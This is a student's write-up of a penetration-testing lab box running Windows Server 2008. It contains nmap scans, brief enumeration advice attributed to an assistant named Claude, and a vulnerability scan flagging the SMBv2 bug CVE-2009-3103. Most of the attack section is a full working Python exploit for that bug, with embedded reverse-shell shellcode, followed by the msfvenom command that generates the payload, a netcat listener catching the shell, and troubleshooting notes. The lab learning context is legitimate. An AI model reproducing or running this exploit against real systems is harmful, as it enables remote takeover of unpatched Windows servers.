My IP 
```
192.168.45.228
```
Target IP: 
```
192.168.236.40
```


# nmap 

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-09-21T04:34:15+00:00
|_ssl-date: 2026-09-21T04:34:23+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-03-04T23:44:47
|_Not valid after:  2025-09-03T23:44:47
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode: 
|   2.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:ea:49 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-20T21:34:15-07:00
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
| smb2-time: 
|   date: 2026-09-21T04:34:15
|_  start_date: 2025-03-05T23:44:46
```

- I realized we end up coming to a dead end fairly quick due to the fact that, there is no web page open on port 80, or port 5357 given that it claims to be a http server. SMB anonymous access works however I was unable to any shares. I even tried adding the domain name `internal` to my hosts file with hope that it would change anything but it did not. 
- After watching a video I learned that the final thing I did not check was to run a nmap script directly for smb, ESPECIALLY given the fact the machine says in our initial nmap pass through that the machine is from 2008
	- Questions I have for claude. There are a few mentions in my initial nmap script that mention  the machine being from 2008, should I just take them all with a grain of salt or is there a specific line I should be looking at (mentioning the 2008) that should be a confluence for me to check and run scripts over services.
		- Claude: Trust the negotiated lines, not the banners — the `smb-os-discovery` block (Server 2008 SP1) and the `CPE cpe:/o:microsoft:windows_server_2008::sp1`. A **specific + old** version is the real cue to run vuln scripts. The dead end was just a nudge; the old version is the actual reason.
	- Is it just SMB scripts that I should ever consider using in the future or are there other services that might be of interest to which there is a script I can run to see if vulnerable.
		- Claude: No — every service can have scripts. For each open port, check if one exists: `ls /usr/share/nmap/scripts/ | grep <service>` (e.g. `smb-*`, `rdp-*`, `http-*`, `dns-*`). SMB was just the first hit.
	- I had a tool called smbmap and i sworn that I had a note for it but its gone. Should I just remain with my enum4linux or add both. And is the reason why I dont have the note because smbmap is banned on the test. 
		- Note added at [[smbmap]] (`01_Enumeration/smbmap.md`).
	- For domain names im always used to it being like offsec.local or something with a dot separating the domain name and the ending. But in this scenario, as seen in our nmap pass that its just `internal`. I still added it to my hosts file when trying this box but this is something i should know. also which is the line that should indicate that that's likely the domain name from our nmap. since there are so many mentions of it. I ended up verifying that internal was the domain name when I had ran crackmapexec smb `<ip>` but i just wonder what ifff there was no smb service active would there be any other way to find that out. 
		- Claude: `internal` isn't a domain — line `Workgroup: WORKGROUP` means it's a **standalone box**, so `internal` is just its hostname. Best source = the `rdp-ntlm-info` block (Target_Name/DNS_Computer_Name). No SMB? You'd still get it from **RDP NTLM info** or the **TLS cert** (`commonName=internal`).


Port 139/445 (SMB):
- After running my script for the smb service here is what we get ->
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-cve-2017-7494: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-conficker: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms07-029: ERROR: Script execution failed (use -d to debug)
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms06-025: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms08-067: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
|_smb-double-pulsar-backdoor: ERROR: Script execution failed (use -d to debug)
|_samba-vuln-cve-2012-1182: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)
```

The highlight from this is the fact that smb is vulnerable to `CVE-2009-3103`. We end up finding this [github repo](https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/tree/main). 
- I ended up getting stuck trying to edit the file and getting my machine code to work.
```
#!/usr/bin/python

import sys
import subprocess
from socket import socket

try:
    target = sys.argv[1]
except IndexError:
    # Print usage information if no target IP is provided
    print('\nUsage: %s <target ip>\n' % sys.argv[0])
    print('Example:  re-write MS36299.py 192.168.1.1 \n')
    sys.exit(-1)

# Generate new shellcode using msfvenom:
# Syntax: msfvenom -p <payload> LHOST=<local host IP> LPORT=<local port> [OPTIONS] -f python
# Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443  EXITFUNC=thread  -f python

# New machinecode generated using msfvenom
shell = b""
shell += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
shell += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x8b"
shell += b"\x72\x28\x0f\xb7\x4a\x26\x31\xc0\xac\x3c\x61\x7c"
shell += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
shell += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
shell += b"\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20"
shell += b"\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34"
shell += b"\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
shell += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
shell += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shell += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shell += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
shell += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
shell += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shell += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d"
shell += b"\xb9\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50"
shell += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shell += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
shell += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
shell += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
shell += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shell += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
shell += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shell += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
shell += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
shell += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
shell += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
shell += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a"
shell += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
shell += b"\x53\xff\xd5"

host = target, 445

buff = b"\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff += b"\x72\x00\x00\x00\x00\x18\x53\xc8"
buff += b"\x17\x02"  # high process ID
buff += b"\x00\xe9\x58\x01\x00\x00"
buff += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buff += b"\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff += b"\x04\x0d\xdf\xff" * 25
buff += b"\x00\x02\x53\x4d"
buff += b"\x42\x20\x32\x2e\x30\x30\x32\x00"
buff += b"\x00\x00\x00\x00" * 37
buff += b"\xff\xff\xff\xff" * 2
buff += b"\x42\x42\x42\x42" * 7
buff += b"\xb4\xff\xff\x3f"  # magic index
buff += b"\x41\x41\x41\x41" * 6
buff += b"\x09\x0d\xd0\xff"  # return address

# Your stager_sysenter_hook from metasploit here...

buff += b"\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff += b"\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff += b"\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff += b"\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff += b"\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff += b"\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff += b"\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff += b"\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff += b"\x68\x76\x01\x00\x00\x59\x89\xd8"
buff += b"\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff += b"\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff += b"\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff += b"\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff += b"\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff += b"\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff += b"\x83\xc2\x04\x81\x22\xff\xff\xff"
buff += b"\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff += b"\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff += b"\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff += b"\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff += b"\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff += b"\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff += b"\x73\x75\x15\xe8\x07\x00\x00\x00"
buff += b"\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff += b"\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff += b"\x61\xc3\x81\xc4\x54\xf2\xff\xff"

buff += shell

# Connect to the target host
s = socket()
s.connect(host)

# Send the buffer containing the shellcode
s.send(buff)

# Close the socket connection
s.close()

# Trigger the above injected code via authenticated process.
subprocess.call("echo '1223456' | rpcclient -U Administrator %s" % (target), shell=True)
```

I ended up creating my own machine code with this command -> 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.228 LPORT=5357  EXITFUNC=thread  -f python -v shell` and replaced it in the file. I set up a listener (mind you im not using msfconsole) and I catch a shell but none of my commands are responsive and the command seems to only work one time before I am needed to revert the whole box 


```
python3 exploit.py 192.168.236.40
Password for [WORKGROUP\Administrator]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
                                                                                               
┌──(nepps1㉿Defalt)-[~/labs/internal/exploits/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-]
└─$ python3 exploit.py 192.168.236.40
^CTraceback (most recent call last):
  File "/home/nepps1/labs/internal/exploits/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/exploit.py", line 115, in <module>
    subprocess.call("echo '1223456' | rpcclient -U Administrator %s" % (target), shell=True)
    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.14/subprocess.py", line 398, in call
    return p.wait(timeout=timeout)
           ~~~~~~^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.14/subprocess.py", line 1279, in wait
    return self._wait(timeout=timeout)
           ~~~~~~~~~~^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.14/subprocess.py", line 2084, in _wait
    (pid, sts) = self._try_wait(0)
                 ~~~~~~~~~~~~~~^^^
  File "/usr/lib/python3.14/subprocess.py", line 2042, in _try_wait
    (pid, sts) = os.waitpid(self.pid, wait_flags)
                 ~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^
KeyboardInterrupt

```

I read from the yt video that the rror was NT_STATUS_LOGON_FAILURE
 is exepcted however the fact i cant run commands from there is so weird. 

```
 nc -lvnp 5357
listening on [any] 5357 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.236.40] 49159
whomai
dir
^C
```


- I ended up learning the cause of my commands not going through was because the payload I generated expected me to use msfconsole to catch the shell. To fix this I need to use another payload like windows/shell_reverse_tcp so that the normal nc listener would work.



I give up. and i refuse to use metasploit. My windows/shell_reverse_tcp

